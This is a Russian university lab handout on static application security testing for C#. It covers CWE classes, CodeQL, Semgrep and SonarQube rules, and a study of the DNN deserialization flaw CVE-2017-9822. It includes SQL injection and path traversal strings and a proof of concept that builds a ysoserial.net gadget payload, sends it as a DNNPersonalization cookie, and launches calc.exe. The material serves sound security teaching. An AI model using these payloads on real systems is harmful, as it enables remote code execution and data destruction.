# ЛР4 SAST — Теория (Вариант 2: C# + SonarQube)

---

## 1. Введение в SAST

**SAST (Static Application Security Testing)** — статический анализ кода безопасности — метод тестирования, при котором исходный код приложения анализируется без его выполнения. SAST-инструменты исследуют код на наличие уязвимостей путём:

- построения **абстрактного синтаксического дерева (AST)**;
- построения **графа потока данных (Data Flow Graph, DFG)**;
- построения **графа вызовов (Call Graph)**;
- применения правил (запросов, паттернов), описывающих известные антипаттерны безопасности.

Основные преимущества SAST:
- анализ проводится на раннем этапе разработки (shift-left);
- покрывает 100% кода (в отличие от динамических инструментов);
- не требует развёртывания приложения.

Основные ограничения:
- высокий процент **ложных срабатываний (false positives)**;
- не выявляет уязвимости времени выполнения (race conditions, проблемы конфигурации);
- зависит от качества правил.

---

## 2. Ключевые понятия: CVE и CWE

### CVE (Common Vulnerabilities and Exposures)
Стандартизированный идентификатор конкретной уязвимости в конкретном ПО. Пример: `CVE-2017-9822`. Каждая запись CVE содержит:
- описание уязвимости;
- ссылки на Advisory, патч, эксплойт;
- оценку критичности **CVSS** (от 0 до 10).

### CWE (Common Weakness Enumeration)
Классификатор типовых слабых мест в программном обеспечении. Описывает категорию ошибок (не конкретную уязвимость). Связь: CWE — тип ошибки → CVE — конкретный экземпляр этой ошибки в ПО.

Пример: CWE-89 «SQL Injection» — тип ошибки; CVE-2021-12345 — конкретная SQL-инъекция в MyApp v1.0.

---

## 3. Пять критических типов ошибок CWE для C\#

Выбраны на основе статистики GitHub Security Lab и встроенных правил CodeQL (`\csharp\ql\src\Security Features\`).

---

### CWE-89 — SQL Injection (Внедрение SQL)

**Описание:** Пользовательские данные попадают в SQL-запрос без санации, что позволяет изменить логику запроса.

**Пример уязвимого кода:**
```csharp
string query = "SELECT * FROM Users WHERE name = '" + userName + "'";
SqlCommand cmd = new SqlCommand(query, conn);
```

**Эксплуатация:** ввод `' OR '1'='1` обходит аутентификацию; `'; DROP TABLE Users--` уничтожает данные.

**Как CodeQL обнаруживает:**
- Source: параметры HTTP-запроса (`Request.QueryString`, `Request.Form`, `RouteData`)
- Sink: конкатенация строк, передаваемых в `SqlCommand`, `OleDbCommand`, `ExecuteNonQuery`, `ExecuteScalar`
- Правило: `csharp/ql/src/Security Features/CWE-089/SqlInjection.ql`

**Исправление:** Параметризованные запросы (`SqlParameter`) или ORM (Entity Framework с LINQ).
```csharp
SqlCommand cmd = new SqlCommand("SELECT * FROM Users WHERE name = @name", conn);
cmd.Parameters.AddWithValue("@name", userName);
```

---

### CWE-79 — Cross-Site Scripting / XSS (Межсайтовый скриптинг)

**Описание:** Данные от пользователя включаются в HTML-ответ без экранирования, что позволяет выполнить произвольный JavaScript в браузере жертвы.

**Типы XSS:**
- **Reflected** — payload в URL-параметре, возвращается в ответе немедленно
- **Stored** — payload сохраняется в БД и отображается другим пользователям
- **DOM-based** — манипуляция DOM на стороне клиента

**Пример уязвимого кода (ASP.NET):**
```csharp
Response.Write("<h1>Hello " + Request["name"] + "</h1>");
```

**Как CodeQL обнаруживает:**
- Source: `Request.QueryString`, `Request.Form`, `Request.Params`
- Sink: `Response.Write`, `HtmlHelper.Raw`, атрибут `[AllowHtml]`, Razor `@Html.Raw(...)`
- Правило: `csharp/ql/src/Security Features/CWE-079/`

**Исправление:** `HttpUtility.HtmlEncode()`, использование Razor `@model` (автоматическое экранирование), `AntiXssEncoder`.

---

### CWE-22 — Path Traversal (Обход пути)

**Описание:** Пользовательские данные формируют путь к файлу без проверки, что позволяет получить доступ к файлам вне разрешённой директории (`../../etc/passwd`).

**Пример уязвимого кода:**
```csharp
string filePath = Path.Combine(baseDir, Request["filename"]);
return File.ReadAllBytes(filePath);
```

**Как CodeQL обнаруживает:**
- Source: HTTP-параметры
- Sink: `File.ReadAllBytes`, `File.Open`, `Directory.GetFiles`, `Path.Combine` без валидации
- Правило: `csharp/ql/src/Security Features/CWE-022/`

**Исправление:**
```csharp
string fullPath = Path.GetFullPath(Path.Combine(baseDir, userInput));
if (!fullPath.StartsWith(baseDir)) throw new UnauthorizedAccessException();
```

---

### CWE-502 — Deserialization of Untrusted Data (Десериализация недоверенных данных)

**Описание:** Данные от внешнего источника десериализуются без проверки типов. В .NET особенно опасен `BinaryFormatter` и `ObjectStateFormatter` — злоумышленник может внедрить «гаджет-цепочку» (gadget chain), которая приводит к выполнению произвольного кода (RCE).

**Пример уязвимого кода:**
```csharp
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream); // данные из HTTP-запроса
```

**Как CodeQL обнаруживает:**
- Source: `HttpContext.Request`, `StreamReader` с данными из сети
- Sink: `BinaryFormatter.Deserialize`, `ObjectStateFormatter.Deserialize`, `LosFormatter.Deserialize`, `SoapFormatter.Deserialize`, `JavaScriptSerializer.Deserialize` с кастомными `JavaScriptTypeResolver`
- Правило: `csharp/ql/src/Security Features/CWE-502/`

**Исправление:** Замена `BinaryFormatter` на `System.Text.Json` / `Newtonsoft.Json` с явным указанием допустимых типов; использование `SerializationBinder` для whitelist-проверки типов.

**Почему особенно опасно в .NET:** Публичные инструменты (`ysoserial.net`) генерируют готовые payload-ы для десятков «гаджет-цепочек» .NET.

---

### CWE-611 — XML External Entity Injection / XXE

**Описание:** XML-парсер обрабатывает внешние сущности (XXE), что позволяет читать файлы с сервера, инициировать SSRF-запросы или вызывать DoS (Billion Laughs).

**Пример уязвимого кода:**
```csharp
XmlDocument doc = new XmlDocument();
doc.XmlResolver = new XmlUrlResolver(); // уязвимо!
doc.LoadXml(userXmlInput);
```

**Как CodeQL обнаруживает:**
- Проверяет наличие `XmlResolver`, настройки `DtdProcessing`, создание `XmlReader` без `XmlReaderSettings` с `DtdProcessing = DtdProcessing.Prohibit`
- Правило: `csharp/ql/src/Security Features/CWE-611/`

**Исправление:**
```csharp
XmlReaderSettings settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};
XmlReader reader = XmlReader.Create(stream, settings);
```

---

## 4. CodeQL

### 4.1 Архитектура

CodeQL — семантический движок анализа кода от GitHub. Принцип работы:

```
Исходный код → CodeQL Database (снимок кода в виде реляционных таблиц) → QL-запросы → Результаты (SARIF)
```

**Компоненты:**
- **CodeQL CLI** — создание БД, выполнение запросов
- **CodeQL для VS Code** — плагин с удобным UI
- **CodeQL Standard Library** — готовые классы и предикаты для анализа C#
- **CodeQL Security Queries** — встроенные правила безопасности

### 4.2 Создание базы данных для C\#

```bash
# Создание БД для C# проекта (MSBuild)
codeql database create mydb --language=csharp --command="dotnet build MyProject.sln"

# Или через CodeQL VS Code: правая кнопка на папке → "Create CodeQL Database"
```

### 4.3 Язык запросов QL

QL — декларативный объектно-ориентированный язык, синтаксически похожий на SQL с элементами Datalog.

**Структура запроса:**
```ql
/**
 * @name SQL Injection
 * @kind path-problem
 * @id cs/sql-injection
 * @tags security CWE-089
 */
import csharp
import semmle.code.csharp.security.dataflow.SqlInjectionQuery

from SqlInjectionConfiguration config, DataFlow::PathNode source, DataFlow::PathNode sink
where config.hasFlowPath(source, sink)
select sink.getNode(), source, sink, "SQL query built from $@.", source.getNode(), "user input"
```

**Ключевые концепции:**
- **Source** — точка входа недоверенных данных (`RemoteFlowSource`)
- **Sink** — опасное использование данных
- **Sanitizer** — функция очистки данных, прерывающая поток
- **DataFlow / TaintTracking** — отслеживание потока данных через вызовы функций

### 4.4 Правила безопасности C\# в CodeQL Starter Workspace

Путь в репозитории: `\csharp\ql\src\Security Features\`

| Директория | CWE | Описание |
|---|---|---|
| `CWE-022/` | Path Traversal | Небезопасная работа с путями файлов |
| `CWE-079/` | XSS | Отражённый и хранимый XSS в ASP.NET |
| `CWE-089/` | SQL Injection | Внедрение SQL через строковую конкатенацию |
| `CWE-090/` | LDAP Injection | Внедрение в LDAP-запросы |
| `CWE-099/` | Resource Injection | Инъекция в пути ресурсов |
| `CWE-502/` | Deserialization | Небезопасная десериализация |
| `CWE-611/` | XXE | XML External Entity |
| `CWE-643/` | XPath Injection | Внедрение в XPath-запросы |

---

## 5. Semgrep

### 5.1 Архитектура

Semgrep — легковесный SAST-инструмент на основе паттернов (pattern matching). Не требует компиляции кода.

```
Исходный код → AST (через tree-sitter) → Матчинг с паттернами → Результаты
```

**Ключевые особенности:**
- Правила в формате **YAML** — читаемы и просты в написании
- Поддержка **30+ языков**
- Интерфейс: CLI, Semgrep Cloud Platform, VS Code плагин
- Встроенный реестр правил: https://semgrep.dev/r

### 5.2 Формат правил Semgrep (YAML)

```yaml
rules:
  - id: csharp-sql-injection
    patterns:
      - pattern: |
          $CMD = new SqlCommand($QUERY + ..., ...);
      - pattern-not: |
          $CMD = new SqlCommand("...", ...);
    message: "Potential SQL Injection: string concatenation in SqlCommand"
    languages: [csharp]
    severity: ERROR
    metadata:
      cwe: CWE-89
      owasp: "A03:2021 - Injection"
```

**Основные операторы паттернов:**

| Оператор | Описание |
|---|---|
| `pattern` | Точное совпадение с паттерном |
| `pattern-not` | Исключить совпадения |
| `pattern-either` | Логическое ИЛИ (несколько паттернов) |
| `pattern-inside` | Паттерн внутри другого блока |
| `pattern-not-inside` | Исключить при нахождении внутри блока |
| `metavariable-regex` | Фильтр по регулярному выражению для переменной |
| `focus-metavariable` | Сфокусировать сообщение на конкретной переменной |

**Метапеременные:**
- `$X` — любое выражение
- `$...ARGS` — произвольное количество аргументов
- `...` — любая последовательность инструкций

### 5.3 Запуск Semgrep

```bash
# Установка
pip install semgrep

# Запуск с реестровыми правилами
semgrep --config "p/csharp" ./src

# Запуск с кастомным правилом
semgrep --config my_rule.yaml ./src

# Вывод в SARIF
semgrep --config "p/csharp" --sarif -o results.sarif ./src
```

---

## 6. SonarQube (Третье средство для Варианта 2)

### 6.1 Архитектура

SonarQube — платформа непрерывной инспекции качества кода и безопасности. Состоит из:
- **SonarQube Server** — веб-интерфейс, хранилище результатов, движок правил
- **SonarScanner** — CLI-инструмент для анализа и отправки результатов на сервер
- **Плагины языков** — анализаторы для C#, Java, Python и др.

```
Код → SonarScanner → SonarQube Server → Dashboard (Issues, Security Hotspots, Bugs)
```

### 6.2 Типы проблем в SonarQube

| Тип | Описание |
|---|---|
| **Bug** | Ошибка в логике, приводящая к некорректной работе |
| **Vulnerability** | Уязвимость безопасности |
| **Security Hotspot** | Код, требующий ручной проверки |
| **Code Smell** | Проблема сопровождаемости |

### 6.3 Формат встроенных правил SonarQube (C\#)

Правила задаются на языке **SonarQube Rule API** (Java/C# Plugin API). Встроенные правила для C# основаны на **Roslyn** (компилятор .NET). Каждое правило имеет:
- **Rule Key** (например, `csharpsquid:S3649` — SQL Injection)
- **SQALE** remediation time
- **Tags**: `security`, `cwe`, `owasp`
- **Default severity**: Blocker / Critical / Major / Minor

**Ключевые встроенные правила безопасности C# (SonarQube):**

| Rule ID | CWE | Название |
|---|---|---|
| `csharpsquid:S3649` | CWE-89 | Database queries should not be vulnerable to injection attacks |
| `csharpsquid:S2091` | CWE-643 | XPath expressions should not be vulnerable to injection attacks |
| `csharpsquid:S2076` | CWE-78 | OS commands should not be vulnerable to injection attacks |
| `csharpsquid:S5131` | CWE-79 | HTTP responses should not be vulnerable to XSS attacks |
| `csharpsquid:S2083` | CWE-22 | I/O function calls should not be vulnerable to path injection attacks |
| `csharpsquid:S5122` | CWE-352 | CORS headers should not be set to allow all |
| `csharpsquid:S4787` | CWE-311 | Encrypting data is security-sensitive |

### 6.4 Запуск SonarQube

```bash
# 1. Запуск SonarQube Server через Docker
docker run -d --name sonarqube -p 9000:9000 sonarqube:community

# 2. Установка SonarScanner для .NET
dotnet tool install --global dotnet-sonarscanner

# 3. Анализ C# проекта
dotnet sonarscanner begin \
  /k:"MyProject" \
  /d:sonar.host.url="http://localhost:9000" \
  /d:sonar.login="admin" \
  /d:sonar.password="admin"

dotnet build

dotnet sonarscanner end /d:sonar.login="admin" /d:sonar.password="admin"
```

### 6.5 Кастомные правила SonarQube

Кастомные правила для C# создаются через **SonarQube C# Plugin SDK** (Roslyn Analyzer). Шаги:
1. Создать .NET-проект типа Roslyn Analyzer (`dotnet new analyzer`)
2. Реализовать `DiagnosticAnalyzer` с логикой обнаружения
3. Упаковать в NuGet и подключить к SonarQube

Альтернатива (без компиляции) — **внешние правила Semgrep**, интегрируемые с SonarQube через SonarQube API.

---

## 7. Выбранное ПО: DotNetNuke (DNN) Platform

### 7.1 Общее описание

**DotNetNuke (DNN)** — одна из старейших и наиболее распространённых CMS (Content Management System) на платформе ASP.NET / C#.

- **GitHub:** https://github.com/dnnsoftware/Dnn.Platform
- **Язык:** C# (.NET Framework)
- **Лицензия:** MIT
- **Позиционирование:** Корпоративный портал, публичные сайты, интрасети

### 7.2 CVE для исследования: CVE-2017-9822

| Атрибут | Значение |
|---|---|
| **CVE ID** | CVE-2017-9822 |
| **CWE** | CWE-502 (Deserialization of Untrusted Data) |
| **CVSS v3** | 8.8 (High) |
| **Уязвимые версии** | DNN ≤ 9.1.0 |
| **Исправлено в** | DNN 9.1.1 |
| **Тип атаки** | Remote Code Execution (RCE) |

### 7.3 Описание уязвимости

В DNN существует механизм персонализации (`PersonalizationController`) — сохранение пользовательских настроек интерфейса в cookie `DNNPersonalization`. Этот cookie сериализован с помощью `BinaryFormatter` и **передаётся без цифровой подписи**.

Атакующий может сформировать вредоносный cookie с «гаджет-цепочкой» .NET (генерируется инструментом **ysoserial.net**) и отправить его серверу. При десериализации на сервере выполняется произвольный код с правами процесса приложения.

**Условия воспроизведения:**
- Сервер работает под управлением DNN ≤ 9.1.0
- Атакующий может отправить HTTP-запрос с cookie `DNNPersonalization`
- Аутентификация не требуется

### 7.4 Уязвимый код

**Файл:** `DotNetNuke.Library/Modules/Personalization/PersonalizationController.cs`

```csharp
// Уязвимый код (до патча)
public static Hashtable LoadProfile(HttpContext context, int userId, int portalId)
{
    Hashtable profile = null;
    // Чтение cookie без верификации
    string cookie = context.Request.Cookies["DNNPersonalization"]?.Value;
    if (!string.IsNullOrEmpty(cookie))
    {
        // Небезопасная десериализация: данные из cookie → LosFormatter
        byte[] bytes = Convert.FromBase64String(cookie);
        using (var ms = new MemoryStream(bytes))
        {
            LosFormatter formatter = new LosFormatter();
            profile = (Hashtable)formatter.Deserialize(ms); // CWE-502
        }
    }
    return profile ?? new Hashtable();
}
```

`LosFormatter` внутри использует `BinaryFormatter`, что открывает возможность для гаджет-цепочек.

### 7.5 Исправление уязвимости

В DNN 9.1.1 был добавлен **HMAC-SHA256** для верификации cookie:

```csharp
// Исправленный код (после патча)
public static Hashtable LoadProfile(HttpContext context, int userId, int portalId)
{
    string cookie = context.Request.Cookies["DNNPersonalization"]?.Value;
    if (string.IsNullOrEmpty(cookie)) return new Hashtable();

    // Верификация подписи перед десериализацией
    if (!IsValidCookieSignature(cookie, GetMachineKey()))
        return new Hashtable(); // Отклонить подозрительный cookie

    string data = ExtractData(cookie);
    byte[] bytes = Convert.FromBase64String(data);
    using (var ms = new MemoryStream(bytes))
    {
        LosFormatter formatter = new LosFormatter();
        return (Hashtable)formatter.Deserialize(ms);
    }
}

private static bool IsValidCookieSignature(string cookie, byte[] key)
{
    // HMAC-SHA256 верификация
    using (var hmac = new HMACSHA256(key))
    {
        // ... логика проверки подписи
    }
}
```

### 7.6 Proof of Concept (PoC)

```bash
# 1. Генерация вредоносного payload через ysoserial.net
# (запускать на машине атакующего)
ysoserial.exe -f LosFormatter -g ObjectDataProvider -c "calc.exe" -o base64

# 2. Отправка запроса с вредоносным cookie
curl -s http://target-dnn-site/Default.aspx \
  -H "Cookie: DNNPersonalization=<BASE64_PAYLOAD>"

# При успехе: на сервере запускается calc.exe (в реальной атаке — reverse shell)
```

**PoC-демонстрация на C#:**
```csharp
// Демонстрация гаджет-цепочки через ObjectDataProvider
// (только в образовательных целях)
using System;
using System.IO;
using System.Web.UI;
using System.Windows.Data;

class PoCDeserialize
{
    static void Main()
    {
        // ObjectDataProvider — стандартный класс WPF, является гаджетом
        var provider = new ObjectDataProvider
        {
            ObjectType = typeof(System.Diagnostics.Process),
            MethodName = "Start"
        };
        provider.MethodParameters.Add("cmd.exe");
        provider.MethodParameters.Add("/c calc.exe");

        // Сериализация в LosFormatter
        var formatter = new LosFormatter();
        using var ms = new MemoryStream();
        formatter.Serialize(ms, provider);
        string payload = Convert.ToBase64String(ms.ToArray());
        Console.WriteLine("Payload (base64): " + payload);

        // Десериализация — эмуляция уязвимого сервера
        ms.Position = 0;
        formatter.Deserialize(ms); // Запускает calc.exe
    }
}
```

### 7.7 Ссылки

| Ресурс | URL |
|---|---|
| NVD CVE | https://nvd.nist.gov/vuln/detail/CVE-2017-9822 |
| Advisory DNN | https://www.dnnsoftware.com/community-blog/cid/155437 |
| Exploit (Rapid7) | https://www.rapid7.com/db/modules/exploit/windows/http/dnn_cookie_deserialization_rce |
| ysoserial.net | https://github.com/pwntester/ysoserial.net |
| Патч (GitHub) | https://github.com/dnnsoftware/Dnn.Platform/releases/tag/v9.1.1 |

---

## 8. Сравнение инструментов SAST

| Характеристика | CodeQL | Semgrep | SonarQube |
|---|---|---|---|
| **Подход** | Семантический анализ потоков данных | Синтаксический паттерн-матчинг | Комбинированный (AST + Data Flow) |
| **Точность** | Высокая | Средняя | Средняя–высокая |
| **Скорость** | Медленно (требует компиляции) | Быстро | Средне |
| **Язык правил** | QL (собственный язык запросов) | YAML | Java/C# (Roslyn) |
| **Порог входа** | Высокий | Низкий | Средний |
| **Ложные срабатывания** | Мало | Зависит от правила | Средне |
| **Интеграция CI/CD** | GitHub Actions | Любая | Jenkins, GitLab, GitHub |
| **Open Source** | Движок закрыт, правила открыты | Открытый | Community Edition открытый |

---

*Документ подготовлен для ЛР4 SAST — Вариант 2 (C#, SonarQube)*
